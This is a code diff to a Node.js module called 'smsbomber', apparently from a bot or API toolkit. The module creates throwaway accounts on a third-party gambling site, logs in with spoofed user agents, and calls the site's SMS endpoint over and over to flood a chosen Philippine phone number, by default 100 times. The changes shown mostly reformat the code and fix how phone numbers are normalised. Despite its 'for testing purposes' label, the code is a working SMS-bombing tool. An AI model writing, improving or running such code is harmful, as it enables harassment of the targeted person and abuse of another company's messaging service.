@@ -4,7 +4,8 @@ const randomUseragent = require("random-useragent");
 exports.config = {
     name: "smsbomber",
     category: "tools",
-    aliases: ["smsbomb", "sendsms"],
+    aliases: ["smsbomb",
+        "sendsms"],
     info: "Send bulk SMS to a target phone number for testing purposes.",
     usage: ["/smsbomber?phone=09276547755&times=100"],
     author: "Kenneth Panio"
@@ -22,16 +23,20 @@ const generateRandomString = (length) => {
 const generateUuidDeviceId = () => {
     return "xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx".replace(/[xy]/g, (c) => {
         const r = Math.random() * 16 | 0;
-        const v = c === "x" ? r : (r & 0x3) | 0x8;
+        const v = c === "x" ? r: (r & 0x3) | 0x8;
         return v.toString(16);
     });
 };
 
 const createAccount = async (username, password, phone) => {
     try {
-        const { data } = await axios.post(
+        const {
+            data
+        } = await axios.post(
             "https://slotmax.vip/api/user/custom/register",
-            { username, password, code: Date.now(), phone, areaCode: "63" },
+            {
+                username, password, code: Date.now(), phone, areaCode: "63"
+            },
             {
                 headers: {
                     "User-Agent": randomUseragent.getRandom((ua) => ua.browserName === "Firefox"),
@@ -52,9 +57,13 @@ const createAccount = async (username, password, phone) => {
 
 const login = async (username, password) => {
     try {
-        const { headers } = await axios.post(
+        const {
+            headers
+        } = await axios.post(
             "https://slotmax.vip/api/user/login",
-            { username, password },
+            {
+                username, password
+            },
             {
                 headers: {
                     "Content-Type": "application/json",
@@ -71,9 +80,13 @@ const login = async (username, password) => {
 
 const sendSms = async (cookie, phone) => {
     try {
-        const { data } = await axios.post(
+        const {
+            data
+        } = await axios.post(
             "https://slotmax.vip/api/user/sms/send/bind",
-            { phone, areaCode: "63" },
+            {
+                phone, areaCode: "63"
+            },
             {
                 headers: {
                     "Content-Type": "application/json",
@@ -90,15 +103,28 @@ const sendSms = async (cookie, phone) => {
 };
 
 // Initialization Function
-exports.initialize = async ({ req, res }) => {
-    let { phone, times } = req.query;
+exports.initialize = async ({
+    req, res
+}) => {
+    let {
+        phone,
+        times
+    } = req.query;
     times = parseInt(times, 10) || 100;
 
-    if (!phone || !/^\d{10}$/.test(phone)) {
-        return res.status(400).json({ error: "Invalid times or missing phone number should be PH number only. start with +63, 63 or 09, 9" });
+    if (phone.startsWith("+63")) {
+        phone = phone.slice(3);
+    } else if (phone.startsWith("63")) {
+        phone = phone.slice(2);
+    } else if (phone.startsWith("0")) {
+        phone = phone.slice(1);
     }
 
-    phone = phone.startsWith("63") ? phone.slice(2) : phone.startsWith("0") ? phone.slice(1) : phone;
+    if (!phone || !/^\d{10}$/.test(phone)) {
+        return res.status(400).json({
+            error: "Invalid times or missing phone number should be PH number only. start with +63, 63 or 09, 9"
+        });
+    }
 
     console.log("📨 Starting SMS bombing...");
     let successCount = 0;
@@ -133,7 +159,9 @@ exports.initialize = async ({ req, res }) => {
     res.json({
         status: true,
         message: `SMS bombing completed.`,
-        details: { success: successCount, failed: failCount },
+        details: {
+            success: successCount, failed: failCount
+        },
         author: exports.config.author,
     });
 };
